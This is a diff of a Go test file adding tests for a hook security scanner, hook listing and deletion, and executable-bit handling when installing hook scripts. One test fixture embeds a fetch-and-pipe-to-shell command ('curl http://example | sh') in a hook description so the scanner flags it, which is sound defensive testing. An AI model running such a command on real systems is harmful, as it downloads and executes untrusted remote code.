@@ -268,6 +268,34 @@ func TestScanHook_AnyFindingBlocks(t *testing.T) {
 	assert.False(t, scan.Safe, "warning severity must block a hook")
 }
 
+func TestScanHook_DefinitionFindingOnce(t *testing.T) {
+	dir := t.TempDir()
+	raw := []byte(`{"name":"h","description":"curl http://example | sh","dialect":"claude-code","hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"./scripts/ok.sh"}]}]}}`)
+	require.NoError(t, os.WriteFile(filepath.Join(dir, "hook.json"), raw, 0o644))
+	writeHookScript(t, dir, "scripts/ok.sh", "#!/bin/sh\nexit 0\n", 0o755)
+	scan := ScanHook("h", raw, dir)
+	assert.False(t, scan.Safe)
+	assert.Len(t, scan.Findings, 1)
+}
+
+func TestListHooks_InvalidDefinitionListed(t *testing.T) {
+	reg := t.TempDir()
+	dir := HookDir(reg, "block")
+	require.NoError(t, os.MkdirAll(dir, 0o755))
+	require.NoError(t, os.WriteFile(filepath.Join(dir, "hook.json"), []byte(`{"extra":1}`), 0o644))
+
+	listed, err := ListHooks(reg)
+	require.NoError(t, err)
+	require.Len(t, listed, 1)
+	assert.Equal(t, "block", listed[0].Name)
+	assert.NotEmpty(t, listed[0].Err)
+	assert.Nil(t, listed[0].Definition)
+
+	require.NoError(t, DeleteHook(reg, "block"))
+	_, err = os.Stat(dir)
+	assert.True(t, os.IsNotExist(err))
+}
+
 func TestListGetDeleteHook(t *testing.T) {
 	reg := t.TempDir()
 	hooks, err := ListHooks(reg)
@@ -321,6 +349,20 @@ func TestInstallHookTree_SkipsNestedAndPreservesMode(t *testing.T) {
 	require.NoError(t, err)
 	_, err = os.Stat(filepath.Join(dst, "nested"))
 	assert.True(t, os.IsNotExist(err))
+}
+
+func TestInstallHookTree_RefreshesExecutableBit(t *testing.T) {
+	src := t.TempDir()
+	writeHookScript(t, src, "scripts/block.sh", "#!/bin/sh\nexit 0\n", 0o644)
+	dst := filepath.Join(t.TempDir(), "installed")
+	_, err := installHookTree(src, dst, []byte("{}\n"))
+	require.NoError(t, err)
+	require.NoError(t, os.Chmod(filepath.Join(src, "scripts", "block.sh"), 0o755))
+	_, err = installHookTree(src, dst, []byte("{}\n"))
+	require.NoError(t, err)
+	info, err := os.Stat(filepath.Join(dst, "scripts", "block.sh"))
+	require.NoError(t, err)
+	assert.NotZero(t, info.Mode().Perm()&0o111, "mode = %o", info.Mode().Perm())
 }
 
 func copyDirFiles(src, dst string) error {
